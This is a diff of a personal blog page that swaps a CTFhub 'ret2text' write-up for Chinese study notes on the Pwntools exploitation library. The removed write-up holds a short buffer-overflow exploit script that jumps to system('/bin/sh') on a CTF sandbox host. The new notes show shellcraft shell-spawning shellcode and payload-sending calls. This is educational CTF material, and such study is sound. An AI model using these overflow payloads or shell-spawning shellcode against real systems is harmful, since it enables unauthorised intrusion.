@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [CTFhub]ret2text
+                                [Pwntools]学习笔记
                             </h1>
                             
                                 <!--en-->
@@ -167,12 +167,12 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-07-01</a>
+                                Date: <a href="#">2021-07-04</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">1.2
+                                    href="#">2.1
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">258</a></span>
+                                    <span class="post-words">words:<a href="#">520</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -186,48 +186,63 @@
                         </header>
                         
                         <div class="post-content">
-                            <blockquote>
-<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+                            <h2 id="0x00-链接">0x00 链接</h2>
+<p>连接远程服务器：</p>
+<pre><code class="language-python">r = remote('[ip]','[port]')
+</code></pre>
+<p>需要在本地进行测试：</p>
+<pre><code class="language-python">r = process('./filename')
+</code></pre>
+<h2 id="0x01-设置运行时的参数">0x01 设置运行时的参数</h2>
+<blockquote>
+<p>通过设置目标架构和操作系统，来告诉Pwntools程序的运行环境。</p>
 </blockquote>
-<p>checksec了一下，64位没开任何保护。<br>
-main函数内容如下：</p>
-<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char v4; // [rsp+0h] [rbp-70h]
-
-  setvbuf(stdout, 0LL, 2, 0LL);
-  setvbuf(stdin, 0LL, 1, 0LL);
-  puts(&quot;Welcome to CTFHub ret2text.Input someting:&quot;);
-  gets(&amp;v4, 0LL);
-  puts(&quot;bye&quot;);
-  return 0;
-}
+<pre><code class="language-python">context.arch = 'i386' #32位程序设置为'i386'，64位程序设置为'amd64'。
+context.os = 'linux'
+context.log_level = 'debug' #可在屏幕上打印debug信息。
+context.endian = 'big' #设置字节序为大端序，小端序设置为little。
 </code></pre>
-<p>找到栈大小和返回地址后，看secure函数，内容如下：</p>
-<pre><code class="language-c">int secure()
-{
-  unsigned int v0; // eax
-  int result; // eax
-  int v2; // [rsp+8h] [rbp-8h]
-  int v3; // [rsp+Ch] [rbp-4h]
-
-  v0 = time(0LL);
-  srand(v0);
-  v3 = rand();
-  __isoc99_scanf((__int64)&amp;unk_4008C8, (__int64)&amp;v2);
-  result = v2;
-  if ( v3 == v2 )
-    result = system(&quot;/bin/sh&quot;);
-  return result;
-}
-</code></pre>
-<p><code>system(&quot;/bin/sh&quot;);</code>的内存地址位0x4007b8，写脚本：</p>
+<p>比较推荐的是使用<code>context.binary</code>自动设置所有适当的值。</p>
 <pre><code class="language-python">from pwn import *
-
-p = remote('challenge-93c6eb0adcd5b58f.sandbox.ctfhub.com',35615)
-payload = 'a'*0x70+'a'*0x08+p64(0x4007B8)
-p.sendline(payload)
-p.interactive()
+context.binary = './filename'
+</code></pre>
+<h2 id="0x02-接收远端回传的数据">0x02 接收远端回传的数据</h2>
+<pre><code class="language-python">r.interactive() #在取得shell之后使用,直接进行交互，相当于回到shell的模式。
+r.recv(numb=字节大小, timeout=default) #接收数据。
+r.recvline(keepends=True) #接收一行，keepends为是否保留行尾的\n。
+r.recvall() #接收数据，直到达到EOF。
+r.recvrepeat(timeout=default) #持续接受直到EOF或timeout。
+</code></pre>
+<h2 id="0x03-向远端发送数据">0x03 向远端发送数据</h2>
+<pre><code class="language-python">r.send() #发送数据。
+r.sendline() #发送一行数据。
+r.sendlineafter('str',payload) #当接收到指定数据时，发送数据。
+</code></pre>
+<h2 id="0x04-获取函数地址">0x04 获取函数地址</h2>
+<blockquote>
+<p>在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。</p>
+</blockquote>
+<pre><code class="language-python">puts_addr = elf.address #获取文件装载的基地址。
+puts_got_addr = elf.got['puts'] #获取puts函数got表地址。
+puts_plt_addr = elf.plt['puts'] #获取puts函数plt表地址。
+puts_sym_addr = elf.symbols['puts'] #获取puts函数符号表地址。
+</code></pre>
+<h2 id="0x05-shellcraft">0x05 shellcraft</h2>
+<blockquote>
+<p>Pwntools已经为你准备好的shellcode。</p>
+</blockquote>
+<pre><code class="language-python">print shellcraft.i386.linux.sh() #32位。
+print shellcraft.amd64.linux.sh() #64位。
+</code></pre>
+<p>Pwntools 提供的 shellcraft 库中的 shellcode 是被<code>asm()</code>函数进行汇编的。</p>
+<pre><code class="language-python">from pwn import *
+shellcode = asm(shellcraft.amd64.linux.sh())
+</code></pre>
+<h2 id="0x06-整数的打包解包">0x06 整数的打包解包</h2>
+<pre><code class="language-python">p32() #将数据打包成32位二进制格式，字节序由context.endian设置。
+p64() #将数据打包成64位二进制格式，字节序由context.endian设置。
+u32() #将32位二进制格式数据解包。
+u64() #将64位二进制格式数据解包。
 </code></pre>
 
                         </div>
@@ -243,7 +258,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/ctfhubret2text/">https://shawr00t.github.io/ctfhubret2text/</a></span>
+                                                <span><a href="https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/">https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -258,9 +273,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/ctfhubret2text/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/ctfhubret2text/&sharesource=qzone&title=[CTFhub]ret2text&pics=https://shawr00t.github.io/images/avatar.png?v=1625386977199&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/ctfhubret2text/&sharesource=weibo&title=[CTFhub]ret2text + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625386977199 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/&sharesource=qzone&title=[Pwntools]学习笔记&pics=https://shawr00t.github.io/images/avatar.png?v=1625386977199&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/&sharesource=weibo&title=[Pwntools]学习笔记 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625386977199 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -295,13 +310,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/buuctfrip/">
-                                                                                            [BUUCTF]rip
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/pwnablekrcollision/">
-                                                                                                    [pwnable.kr]collision
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/buuctfrip/">
+                                                                                                    [BUUCTF]rip
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
